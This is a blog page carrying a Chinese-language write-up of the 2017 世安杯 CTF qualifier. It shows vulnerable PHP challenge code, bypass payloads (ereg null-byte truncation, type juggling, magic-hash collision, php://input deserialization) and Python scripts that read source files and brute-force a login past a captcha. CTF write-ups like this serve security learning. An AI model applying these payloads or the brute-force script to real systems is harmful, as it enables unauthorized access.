<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[2017世安杯] 初赛Web Writeup | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">7</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[2017世安杯] 初赛Web Writeup</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Oct 9, 2017
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#writeup" class="reserved">writeup</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
        
          <span id="/posts/%E4%B8%96%E5%AE%89%E6%9D%AF-%E5%88%9D%E8%B5%9BWeb-Writeup/" class="leancloud_visitors" data-flag-title="[2017世安杯] 初赛Web Writeup">
            Page view:
            <span class="leancloud-visitors-count"></span>
          </span>
        
    </p>
  </header>

  <article class="post-content">
  <h2 id="web">Web：</h2>

<p>##### ctf入门级题目
view_source有源码，如下</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$flag</span> <span class="o">=</span> <span class="s1">'*********'</span><span class="p">;</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span> <span class="p">(</span><span class="s2">"^[a-zA-Z0-9]+$"</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span> <span class="o">===</span> <span class="kc">FALSE</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s1">'&lt;p class="alert"&gt;You password must be alphanumeric&lt;/p&gt;'</span><span class="p">;</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'password'</span><span class="p">],</span> <span class="s1">'--'</span><span class="p">)</span> <span class="o">!==</span> <span class="kc">FALSE</span><span class="p">)</span>
        <span class="k">die</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
    <span class="k">else</span>
        <span class="k">echo</span> <span class="s1">'&lt;p class="alert"&gt;Invalid password&lt;/p&gt;'</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="nt">&lt;section</span> <span class="na">class=</span><span class="s">"login"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"./index.phps"</span><span class="nt">&gt;</span>View Source<span class="nt">&lt;/a&gt;</span>
        <span class="nt">&lt;/div&gt;</span>

        <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">required</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">placeholder=</span><span class="s">"Password"</span> <span class="nt">/&gt;&lt;br/&gt;</span>
                <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;/section&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>根据源码，ereg可被%00截断，直接上payload</p>

<ul>
  <li>payload : <code class="highlighter-rouge">?password=123%00--</code></li>
  <li>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/1.png" alt="poc" /></li>
  <li>flag : <code class="highlighter-rouge">flag{Maybe_using_rexpexp_wasnt_a_clever_move}</code></li>
</ul>

<hr />

<p>##### 曲奇饼
题目已经提示了和cookie应该是有关的
进去之后发现是老题目，file是base64之后的文件名称，line是读取文件的行数
可以直接写个脚本读取index.php的源码， 脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="n">url</span> <span class="o">=</span> <span class="s">'http://ctf1.shiyanbar.com/shian-quqi/index.php?line=%d&amp;file=aW5kZXgucGhw'</span>
<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">40</span><span class="p">):</span>
    <span class="k">print</span> <span class="n">se</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">%</span> <span class="n">x</span><span class="p">).</span><span class="n">content</span>
</code></pre></div></div>

<p><img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/2.png" alt="source" />
这里要求我们带有一个值为li_lr_480，名称为key的cookie，这样我们就能读取到thisis_flag.php的源码了
直接控制台document.cookie写cookie 然后将thisis_flag.php 进行base64编码后提交得到flag</p>
<ul>
  <li>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/3.png" alt="poc" /></li>
  <li>flag : flag{UHGgd3rfH*(3HFhuiEIWF}</li>
</ul>

<hr />

<h5 id="类型">类型</h5>
<p>进去之后有源码，如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span> 
<span class="nv">$a</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
<span class="nv">$b</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
<span class="nv">$c</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
<span class="nv">$d</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x1'</span><span class="p">]))</span> 
<span class="p">{</span> 
        <span class="nv">$x1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x1'</span><span class="p">];</span> 
        <span class="nv">$x1</span><span class="o">==</span><span class="s2">"1"</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"ha?"</span><span class="p">)</span><span class="o">:</span><span class="kc">NULL</span><span class="p">;</span> 
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$x1</span><span class="p">)</span> 
        <span class="p">{</span> 
        <span class="k">case</span> <span class="mi">0</span><span class="o">:</span> 
        <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> 
                <span class="nv">$a</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> 
                <span class="k">break</span><span class="p">;</span> 
        <span class="p">}</span> 
<span class="p">}</span> 
<span class="nv">$x2</span><span class="o">=</span><span class="p">(</span><span class="k">array</span><span class="p">)</span><span class="nb">json_decode</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x2'</span><span class="p">]);</span> 
<span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$x2</span><span class="p">)){</span> 
    <span class="nb">is_numeric</span><span class="p">(</span><span class="o">@</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x21"</span><span class="p">])</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"ha?"</span><span class="p">)</span><span class="o">:</span><span class="kc">NULL</span><span class="p">;</span> 
    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x21"</span><span class="p">]){</span> 
        <span class="p">(</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x21"</span><span class="p">]</span><span class="o">&gt;</span><span class="mi">2017</span><span class="p">)</span><span class="o">?</span><span class="nv">$b</span><span class="o">=</span><span class="mi">1</span><span class="o">:</span><span class="kc">NULL</span><span class="p">;</span> 
    <span class="p">}</span> 
    <span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="o">@</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x22"</span><span class="p">])){</span> 
        <span class="k">if</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x22"</span><span class="p">])</span><span class="o">!==</span><span class="mi">2</span> <span class="k">OR</span> <span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x22"</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="k">die</span><span class="p">(</span><span class="s2">"ha?"</span><span class="p">);</span> 
        <span class="nv">$p</span> <span class="o">=</span> <span class="nb">array_search</span><span class="p">(</span><span class="s2">"XIPU"</span><span class="p">,</span> <span class="nv">$x2</span><span class="p">[</span><span class="s2">"x22"</span><span class="p">]);</span> 
        <span class="nv">$p</span><span class="o">===</span><span class="kc">false</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"ha?"</span><span class="p">)</span><span class="o">:</span><span class="kc">NULL</span><span class="p">;</span> 
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$x2</span><span class="p">[</span><span class="s2">"x22"</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$val</span><span class="p">){</span> 
            <span class="nv">$val</span><span class="o">===</span><span class="s2">"XIPU"</span><span class="o">?</span><span class="k">die</span><span class="p">(</span><span class="s2">"ha?"</span><span class="p">)</span><span class="o">:</span><span class="kc">NULL</span><span class="p">;</span> 
        <span class="p">}</span> 
        <span class="nv">$c</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="p">}</span> 
<span class="nv">$x3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x3'</span><span class="p">];</span> 
<span class="k">if</span> <span class="p">(</span><span class="nv">$x3</span> <span class="o">!=</span> <span class="s1">'15562'</span><span class="p">)</span> <span class="p">{</span> 
    <span class="k">if</span> <span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$x3</span><span class="p">,</span> <span class="s1">'XIPU'</span><span class="p">))</span> <span class="p">{</span> 
        <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$x3</span><span class="p">),</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="s1">'15562'</span><span class="p">),</span><span class="mi">8</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span> <span class="p">{</span> 
            <span class="nv">$d</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> 
        <span class="p">}</span> 
    <span class="p">}</span> 
<span class="p">}</span> 
<span class="k">if</span><span class="p">(</span><span class="nv">$a</span> <span class="o">&amp;&amp;</span> <span class="nv">$b</span> <span class="o">&amp;&amp;</span> <span class="nv">$c</span> <span class="o">&amp;&amp;</span> <span class="nv">$d</span><span class="p">){</span> 
    <span class="k">include</span> <span class="s2">"flag.php"</span><span class="p">;</span> 
    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span> 
<span class="p">}</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>还是老题目。。。首先a是1a的方式绕过判断，因为在switch中字符串和数字比较php会尝试将字符串intval后比较（或者是这里直接将x1赋值为0，这里的switch有使用错误的嫌疑）。b同样是利用字符串与数字比较的特点进行绕过 只需要赋值为2018aaa即可，c是利用array_search有如下特性：
<img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/4.png" alt="特性" /></p>

<p>d的话首先发现 <code class="highlighter-rouge">substr(md5('15562'),8,16)</code>是0e开头，则我们需要把x3构造成0e开头的后面全都是数字的md5即可，这里直接上脚本碰撞，脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding:utf8
</span><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">print</span> <span class="s">'[*] 第'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">'次碰撞'</span>
    <span class="n">testStr</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">sample</span><span class="p">(</span><span class="s">'qwertyuiopasdfghjklzxcvbnm1234567890'</span><span class="p">,</span><span class="mi">4</span><span class="p">)).</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">testCode</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="s">'XIPU'</span><span class="o">+</span><span class="n">testStr</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">testCode</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'0e'</span><span class="p">)</span> <span class="ow">and</span> <span class="n">testCode</span><span class="p">[</span><span class="mi">2</span><span class="p">:].</span><span class="n">isdigit</span><span class="p">():</span>
        <span class="k">print</span> <span class="n">testStr</span>
        <span class="k">print</span> <span class="n">testCode</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
        <span class="k">print</span> <span class="s">'[*] 耗时 '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">st</span><span class="p">)</span> <span class="o">+</span> <span class="s">' s'</span>
        <span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>构造如下payload绕过：</p>
<ul>
  <li>payload : <code class="highlighter-rouge">?x1=1a&amp;x2={"x21":"2018aa","x22":[[1],0],"0":3}&amp;x3=XIPUvg6c</code></li>
  <li>
    <p>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/5.png" alt="poc" /></p>
  </li>
  <li>flag : <code class="highlighter-rouge">CTF{Php_1s_bstl4_1a}</code></li>
</ul>

<hr />

<h5 id="登录">登录</h5>
<p>进去之后发现是一个登录框， 源码有提示密码是5位数字，直接上脚本跑出密码：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding:utf8
</span><span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">'http://ctf1.shiyanbar.com/shian-s/'</span>
<span class="n">se</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="ow">not</span> <span class="n">flag</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">content</span> <span class="o">=</span> <span class="n">se</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="n">content</span>
            <span class="n">code</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'&lt;input name="randcode" type="text"&gt;&lt;br&gt;&lt;br&gt;(\d+)&lt;br&gt;&lt;br&gt;'</span><span class="p">,</span> <span class="n">content</span> <span class="p">,</span><span class="n">re</span><span class="p">.</span><span class="n">S</span><span class="o">|</span><span class="n">re</span><span class="p">.</span><span class="n">M</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">flag</span> <span class="o">=</span> <span class="mi">1</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">e</span>
    <span class="k">print</span> <span class="n">code</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">se</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s">'?username=admin&amp;password='</span><span class="o">+</span><span class="n">x</span><span class="o">+</span><span class="s">'&amp;randcode='</span><span class="o">+</span><span class="n">code</span><span class="p">)</span>
    <span class="k">print</span> <span class="s">'[*] Trying '</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="s">'密码错误'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span> <span class="ow">and</span> <span class="s">'button'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span> <span class="ow">and</span> <span class="s">'502'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">)</span><span class="err"> </span> <span class="ow">or</span> <span class="s">'flag'</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">x</span>
        <span class="k">print</span> <span class="s">'-------'</span>
        <span class="k">print</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="s">'验证码错误'</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">content</span><span class="p">:</span>
        <span class="k">print</span> <span class="s">'验证码错误！！！'</span>
        <span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>密码为00325</p>
<ul>
  <li>
    <p>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/6.png" alt="poc" /></p>
  </li>
  <li>
    <p>flag : <code class="highlighter-rouge">flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}</code></p>
  </li>
</ul>

<hr />

<h5 id="web5">web5</h5>
<p>又是反序列化的老题目了。。。。
直接上payload吧。。</p>

<ul>
  <li>payload : <code class="highlighter-rouge">?user=php://input&amp;file=class.php&amp;pass=O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}</code></li>
  <li>
    <p>poc : <img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/7.png" alt="poc" /></p>
  </li>
  <li>flag : <code class="highlighter-rouge">flag_Xd{hSh_ctf:e@syt0g3t}</code></li>
</ul>

<hr />

<h2 id="reverse">Reverse</h2>
<h5 id="console">Console</h5>
<p>首先直接看hex观察到是一个dotnet的程序，直接用reflector反汇编，然后修改有输出的那一个函数，直接打印出flag，done</p>

<p><img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/8.png" alt="修改代码" /></p>
<ul>
  <li>
    <p>poc : 
<img src="/assets/images/posts/2017/世安杯-初赛Web-Writeup/9.png" alt="poc" /></p>
  </li>
  <li>
    <p>flag : <code class="highlighter-rouge">flag{967DDDFBCD32C1F53527C221D9E40A0B}</code></p>
  </li>
</ul>

<hr />

<p>写在最后：感觉。。。这次体验不太好。。早上的时候估计是服务器崩了。。直接跳过选择题。。。然后下午一直都交不了flag。。。直到晚上8点钟催了3次之后才弄好的。。。emmm 然后Web的好像都是老题。。。像是实验吧一日游。。。(逃 然后明天就马上决赛。。。。</p>

  </article>

	<p class="feed-recomendation">
		Did you like the post? Subscribe to the <a href="/feed/">feed</a>.
	</p>

  <div id="disqus_thread"></div>
<script type="text/javascript">
    /* * * CONFIGURATION VARIABLES * * */
    var disqus_shortname = 'pr0ph3t';
    var disqus_config = function () {
        this.page.identifier = "/posts/%E4%B8%96%E5%AE%89%E6%9D%AF-%E5%88%9D%E8%B5%9BWeb-Writeup/";
    };
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




</div>

  </article>

</div>

            </main>
          </div>
        </div>

        <div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <footer>
      Thx!
    </footer>
  </div>
</div>
<script src="https://libs.cdnjs.net/jquery/3.3.1/jquery.min.js"></script>
<script src="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css"></script>
<script>
$(document).ready(function() {
	$("img").each(function() {
		var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
		$(this).wrapAll(strA);
    });
});
</script>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-87275583-1']);
  _gaq.push(['_trackPageview']);
 (function() {
   var ga = document.createElement('script');ga.type = 'text/javascript'; ga.async = true;
   ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
   var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
  <script>
    AV.initialize("FUf6n3OvGTkv0cqnGGbJyS5Q-MdYXbMMI", "FV3i9cojG6DyOMel86rUaaqR");
    AV.useAVCloudUS();
    //新增访问次数
    function addCount(Counter) {
      // 页面（博客文章）中的信息：leancloud_visitors
      // id为page.url， data-flag-title为page.title
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("visited_times");// 将点击次数加1
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                var newTimes = counter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            // 执行这里，说明LeanCloud中还没有记录此文章
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("post_title", title);// 把文章标题
            newcounter.set("post_url", url); // 文章url
            newcounter.set("visited_times", 1); // 初始点击次数：1次
            newcounter.save(null, { // 上传到LeanCloud服务器中
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                var newTimes = newcounter.get('visited_times');
                $element.find('.leancloud-visitors-count').text(newTimes);
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //仅根据url和title查出当前访问次数，不做+1操作
    function showCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      // 只根据文章的url查询LeanCloud服务器中的数据
      query.equalTo("post_url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {//说明LeanCloud中已经记录了这篇文章
            var counter = results[0];
            var $element = $(document.getElementById(url));
            var newTimes = counter.get('visited_times');
            $element.find('.leancloud-visitors-count').text(newTimes);
          } else {
            //如果表里没查到记录，那就是异常情况了
            console.log('异常情况，不应该没记录的');
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    //调用API获取IP
    function getVisitorIpAndJudge() {
      var ip;
      var options = {
        type: 'GET',
        url: "https://ctf.pr0ph3t.com/"
      };
      $.ajax(options)
      .done(function(data, textStatus, jqXHR) {
        if(textStatus == "success") {
          ip = data.trim().split('<br>')[0];
        }
        judgeVisitor(ip)
      });
    }

    //判断访客是否已访问过该文章，及访问时间，符合条件则增加一次访问次数
    function judgeVisitor(ip) {
      var Counter = AV.Object.extend("visited_times");
      var Visitor = AV.Object.extend("visitors_record");

      var $postInfo = $(".leancloud_visitors");
      var post_url = $postInfo.attr('id').trim();

      var query = new AV.Query(Visitor);

      query.equalTo("visitor_ip", ip);
      query.equalTo("post_url", post_url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            console.log('该IP已访问过该文章');

            var oldVisitor = results[0];

            var lastTime = oldVisitor.updatedAt;
            var curTime = new Date();

            var timePassed = curTime.getTime() - lastTime.getTime();

            if(timePassed > 1 * 60 * 1000) {
              console.log('距离该IP上一次访问该文章已超过了1分钟，更新访问记录，并增加访问次数');

              addCount(Counter);

              oldVisitor.fetchWhenSave(true);
              oldVisitor.save(null, {
                success: function(oldVisitor) { },
                error: function(oldVisitor, error) {
                  console.log('Failed to save visitor record, with error message: ' + error.message);
                }
              });
            } else {
              console.log('这是该IP 1分钟内重复访问该文章，不更新访问记录，不增加访问次数');
              showCount(Counter);
            }
          } else {
            console.log('该IP第一次访问该文章，保存新的访问记录，并增加访问次数');

            addCount(Counter);

            var newVisitor = new Visitor();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newVisitor.setACL(acl);
            newVisitor.set("visitor_ip", ip);
            newVisitor.set("post_url", post_url);
            newVisitor.save(null, { // 上传到LeanCloud服务器中
              success: function(newVisitor) { },
              error: function(newVisitor, error) {
                console.log('Failed to create visitor record, with error message: ' + error.message);
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
          addCount(Counter);
        }
      });
    }

    $(function() {
      if ($('.leancloud_visitors').length == 1) {
        // 文章页面，调用判断方法，对符合条件的访问增加访问次数
        getVisitorIpAndJudge();
      } else if ($('.post-link').length > 1){
        // 首页 暂未使用
        // showHitCount(Counter);
      }
    });
  </script>

<!-- <script type="text/javascript" src="/assets/js/images.js"></script> -->

      </div>
    </body>
</html>
